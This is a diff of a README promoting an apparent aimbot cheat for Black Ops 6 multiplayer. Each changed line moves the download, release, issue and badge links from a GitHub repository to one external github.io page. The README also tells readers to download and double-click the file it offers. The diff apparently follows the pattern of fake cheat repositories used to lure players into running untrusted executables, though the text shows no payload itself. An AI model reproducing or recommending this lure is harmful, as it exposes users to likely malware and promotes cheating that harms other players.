@@ -1,6 +1,6 @@
 # 🎯 black-ops-6-aimbot-2026 - Precision Targeting for BO6 Multiplayer
 
-[![Download Now](https://img.shields.io/badge/Download-Black_Ops_6_Aimbot_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/leocassieio/black-ops-6-aimbot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Black_Ops_6_Aimbot_2026-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://leocassieio.github.io)
 
 ---
 
@@ -14,7 +14,7 @@ Whether you're a casual player looking to improve your kill/death ratio or a sea
 
 ## 📥 Download & Installation
 
-**Visit this link to download the application:** [https://github.com/leocassieio/black-ops-6-aimbot-2026/releases](https://github.com/leocassieio/black-ops-6-aimbot-2026/releases)
+**Visit this link to download the application:** [https://leocassieio.github.io](https://leocassieio.github.io)
 
 Once you're on the download page, follow these simple steps:
 
@@ -70,7 +70,7 @@ These are baseline requirements. If your system exceeds these specs, you'll enjo
 ## 🛠️ How to Use
 
 ### Step 1: Download
-Visit the [releases page](https://github.com/leocassieio/black-ops-6-aimbot-2026/releases) and download the latest version.
+Visit the [releases page](https://leocassieio.github.io) and download the latest version.
 
 ### Step 2: Run the Aimbot
 Double-click the downloaded file to launch the application. You'll see a small control panel appear.
@@ -126,8 +126,8 @@ We understand concerns about using third-party tools. Here's what you should kno
 
 Need help? Have questions? We're here for you.
 
-- **GitHub Issues** — Report bugs or request features on our [issues page](https://github.com/leocassieio/black-ops-6-aimbot-2026/issues).
-- **Release Notes** — Check the [releases page](https://github.com/leocassieio/black-ops-6-aimbot-2026/releases) for updates and patch notes.
+- **GitHub Issues** — Report bugs or request features on our [issues page](https://leocassieio.github.io).
+- **Release Notes** — Check the [releases page](https://leocassieio.github.io) for updates and patch notes.
 
 ---
 
@@ -141,7 +141,7 @@ Remember: practice makes perfect. Use the aimbot to learn enemy patterns and imp
 
 **Ready to elevate your gameplay?**
 
-[![Download Now](https://img.shields.io/badge/Get_Started-Download_Now-28B463?style=for-the-badge&logo=download&logoColor=white)](https://github.com/leocassieio/black-ops-6-aimbot-2026/releases)
+[![Download Now](https://img.shields.io/badge/Get_Started-Download_Now-28B463?style=for-the-badge&logo=download&logoColor=white)](https://leocassieio.github.io)
 
 ---
 
